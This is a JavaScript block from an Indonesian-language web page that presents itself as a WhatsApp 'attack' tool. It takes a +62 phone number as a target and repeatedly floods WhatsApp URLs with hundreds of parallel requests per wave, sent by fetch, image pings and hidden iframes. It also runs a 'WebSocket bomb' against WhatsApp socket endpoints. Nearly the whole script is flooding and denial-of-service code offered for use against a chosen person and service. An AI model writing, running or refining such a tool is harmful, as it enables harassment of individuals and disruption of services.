    <script>
        (function() {
            // === Particle animation (background) ===
            const canvas = document.getElementById('particle-canvas');
            const ctx = canvas.getContext('2d');
            let width, height;
            let particles = [];

            function initCanvas() {
                width = window.innerWidth;
                height = window.innerHeight;
                canvas.width = width;
                canvas.height = height;
                createParticles(100);
            }

            function createParticles(count) {
                for (let i = 0; i < count; i++) {
                    particles.push({
                        x: Math.random() * width,
                        y: Math.random() * height,
                        vx: (Math.random() - 0.5) * 0.8,
                        vy: (Math.random() - 0.5) * 0.8,
                        size: Math.random() * 3 + 1,
                        color: `rgba(255, ${Math.floor(Math.random()*100)}, 100, 0.8)`
                    });
                }
            }

            function drawParticles() {
                ctx.clearRect(0, 0, width, height);
                ctx.fillStyle = 'white';
                particles.forEach(p => {
                    ctx.beginPath();
                    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                    ctx.fillStyle = p.color;
                    ctx.fill();
                    p.x += p.vx;
                    p.y += p.vy;
                    if (p.x < 0 || p.x > width) p.vx *= -1;
                    if (p.y < 0 || p.y > height) p.vy *= -1;
                });
                requestAnimationFrame(drawParticles);
            }

            window.addEventListener('resize', () => {
                initCanvas();
            });
            initCanvas();
            drawParticles();

            // === Variabel serangan ===
            let attackActive = false;
            let requestCount = 0;
            let rps = 0;
            let lastRpsUpdate = Date.now();
            let attackInterval = null;
            let intensity = 500; // default
            const targetInput = document.getElementById('targetNumber');
            const launchBtn = document.getElementById('launchBtn');
            const stopBtn = document.getElementById('stopBtn');
            const counterSpan = document.getElementById('counter');
            const rpsSpan = document.getElementById('rps');
            const logBox = document.getElementById('logBox');
            const progressFill = document.getElementById('progressFill');
            const intensitySlider = document.getElementById('intensitySlider');
            const intensityValue = document.getElementById('intensityValue');

            intensitySlider.addEventListener('input', (e) => {
                intensity = parseInt(e.target.value);
                intensityValue.innerText = intensity;
            });

            function addLog(message, type = 'info') {
                const item = document.createElement('div');
                item.className = 'log-item';
                const prefix = type === 'success' ? '‚úÖ' : (type === 'error' ? '‚ùå' : 'üí¢');
                item.textContent = `[${new Date().toLocaleTimeString()}] ${prefix} ${message}`;
                logBox.appendChild(item);
                logBox.scrollTop = logBox.scrollHeight;
                if (logBox.children.length > 150) {
                    logBox.removeChild(logBox.children[0]);
                }
            }

            function validateNumber(num) {
                return /^\+62[0-9]{6,15}$/.test(num);
            }

            function sanitizeNumber(raw) {
                let cleaned = raw.replace(/[^0-9+]/g, '');
                if (!cleaned.startsWith('+62')) {
                    if (cleaned.startsWith('62')) cleaned = '+' + cleaned;
                    else cleaned = '+62' + cleaned.replace(/^0+/, '');
                }
                return cleaned;
            }

            // === MULTI VECTOR ATTACK ===
            async function sendRequest(url, method = 'GET') {
                try {
                    await fetch(url, { method, mode: 'no-cors', cache: 'no-cache' });
                } catch { }
                // image ping
                try {
                    let img = new Image();
                    img.src = url + '?img=' + Date.now() + Math.random();
                } catch { }
                // iframe
                try {
                    let iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = url;
                    document.body.appendChild(iframe);
                    setTimeout(() => iframe.remove(), 100);
                } catch { }
            }

            // WebSocket bomb (coba connect ke WhatsApp WebSocket)
            function webSocketBomb(targetNumber) {
                // beberapa endpoint ws umum
                const wsUrls = [
                    'wss://web.whatsapp.com/ws',
                    'wss://v3.web.whatsapp.com/ws',
                    'wss://wsa1.whatsapp.net:443',
                    'wss://wsa2.whatsapp.net:443'
                ];
                wsUrls.forEach(url => {
                    try {
                        let ws = new WebSocket(url);
                        ws.onopen = () => ws.close();
                        setTimeout(() => { try{ws.close()}catch(e){}, 50 });
                    } catch (e) {}
                });
            }

            // === Attack loop ===
            function startAttack(target) {
                attackActive = true;
                requestCount = 0;
                const targetClean = sanitizeNumber(target);
                if (!validateNumber(targetClean)) {
                    addLog('NOMOR NGACO! PAKE +62...', 'error');
                    attackActive = false;
                    return;
                }
                const waNumber = targetClean.substring(1);
                addLog(`üéØ TARGET: ${targetClean}`, 'info');
                addLog(`üí£ INTENSITAS: ${intensity} ROKET PER GELOMBANG`, 'info');

                const baseUrls = [
                    `https://wa.me/${waNumber}`,
                    `https://api.whatsapp.com/send?phone=${waNumber}`,
                    `https://web.whatsapp.com/send?phone=${waNumber}`,
                    `https://chat.whatsapp.com/`, // invite? tp ga spesifik, tetap dikirim
                    `https://faq.whatsapp.com/`, // beban tambahan
                    `https://www.whatsapp.com/`,
                    `https://blog.whatsapp.com/`
                ];

                let wave = 0;
                attackInterval = setInterval(async () => {
                    if (!attackActive) return;

                    wave++;
                    const currentIntensity = intensity; // ambil terbaru
                    const progress = Math.min(100, (wave / 20) * 100); // progress dummy based on wave
                    progressFill.style.width = progress + '%';

                    // Kirim banyak request paralel
                    const promises = [];
                    for (let i = 0; i < currentIntensity; i++) {
                        const randomBase = baseUrls[Math.floor(Math.random() * baseUrls.length)];
                        // acak parameter
                        const url = randomBase + (randomBase.includes('?') ? '&' : '?') + 'r=' + wave + '_' + i + '&t=' + Date.now();
                        promises.push(sendRequest(url));
                        requestCount++;
                    }
                    await Promise.all(promises);

                    // Tambah WebSocket bomb setiap 5 wave
                    if (wave % 5 === 0) {
                        for (let s = 0; s < 20; s++) {
                            webSocketBomb(waNumber);
                        }
                        addLog(`‚ò¢Ô∏è WebSocket bomb #${wave} diluncurkan!`, 'success');
                    }

                    counterSpan.innerText = requestCount.toLocaleString();

                    // Hitung RPS
                    const now = Date.now();
                    const delta = (now - lastRpsUpdate) / 1000;
                    if (delta >= 1) {
                        rps = Math.round(requestCount / delta);
                        rpsSpan.innerText = rps;
                        lastRpsUpdate = now;
                        requestCount = 0; // reset buat interval selanjutnya? biar per detik
                    }

                    if (wave % 10 === 0) {
                        addLog(`üåä GELOMBANG #${wave} selesai, total ${(wave * currentIntensity).toLocaleString()} request`, 'success');
                    }

                    if (wave >= 100) { // batasi 100 gelombang agar tidak overload browser sendiri
                        addLog('‚ö†Ô∏è BATAS AMAN 100 GELOMBANG, BERHENTI OTOMATIS', 'error');
                        stopAttack();
                    }
                }, 400); // setiap 400ms gelombang baru
            }

            function stopAttack() {
                attackActive = false;
                if (attackInterval) {
                    clearInterval(attackInterval);
                    attackInterval = null;
                }
                progressFill.style.width = '0%';
                addLog('‚õî SERANGAN DIHENTIKAN', 'error');
            }

            launchBtn.addEventListener('click', () => {
                if (attackActive) {
                    stopAttack();
                    setTimeout(() => {
                        startAttack(targetInput.value);
                    }, 200);
                } else {
                    startAttack(targetInput.value);
                }
            });

            stopBtn.addEventListener('click', stopAttack);

            // Enter key
            targetInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') launchBtn.click();
            });

            // Bersihkan saat unload
            window.addEventListener('beforeunload', () => {
                stopAttack();
            });
        })();
    </script>
